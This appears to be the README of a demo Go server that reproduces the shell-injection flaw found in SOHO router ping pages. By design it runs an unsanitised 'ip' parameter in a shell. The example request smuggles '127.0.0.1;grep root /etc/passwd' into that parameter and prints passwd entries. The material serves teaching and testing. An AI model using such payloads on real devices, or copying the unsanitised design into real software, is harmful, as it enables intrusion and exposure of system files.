PingInject
==========
This is a little server meant for demonstrating the sort of shell injection
commonly found in the ping feature of SOHO routers.

Shell injection is a trick which takes advantage of a program which passes
unsanitized (or badly-sanitized) input straight to the shell.

Usage
-----
Should run pretty well out of the box.  By default, any query which has an `ip`
parameter will append its value to `/sbin/ping -c 4 `, run it in a shell, and
return stdout and stderr in the response.

Example
-------
Server:
```sh
$ go run github.com/magisterquis/pinginject
2019/09/21 11:37:48 Listening on 0.0.0.0:8080 for HTTP requests
2019/09/21 11:38:19 [127.0.0.1:28103] POST /ping.php Q: "127.0.0.1;grep root /etc/passwd" (516)
```
Client:
```sh
$ curl --data-urlencode 'ip=127.0.0.1;grep root /etc/passwd' 'localhost:8080/ping.php'                                                                               
PING 127.0.0.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: icmp_seq=0 ttl=255 time=0.016 ms
64 bytes from 127.0.0.1: icmp_seq=1 ttl=255 time=0.068 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=255 time=0.066 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=255 time=0.067 ms

--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 packets received, 0.0% packet loss
round-trip min/avg/max/std-dev = 0.016/0.054/0.068/0.022 ms
root:*:0:0:Charlie &:/root:/bin/ksh
daemon:*:1:1:The devil himself:/root:/sbin/nologin
```
